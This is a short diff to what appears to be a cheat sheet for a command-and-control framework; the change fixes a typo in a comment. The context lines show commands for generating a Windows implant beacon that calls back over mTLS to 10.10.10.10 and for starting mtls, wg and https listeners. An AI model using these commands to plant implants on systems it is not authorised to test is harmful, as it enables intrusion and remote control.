@@ -48,7 +48,7 @@ generate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows --save /path/t
 // Regenerate
 regenerate
 // listeners
-// Do not accept interfaces as arguemnts like metasploit
+// Do not accept interfaces as arguments like metasploit
 mtls -L <lhost> -l <lport> 
 wg
 https
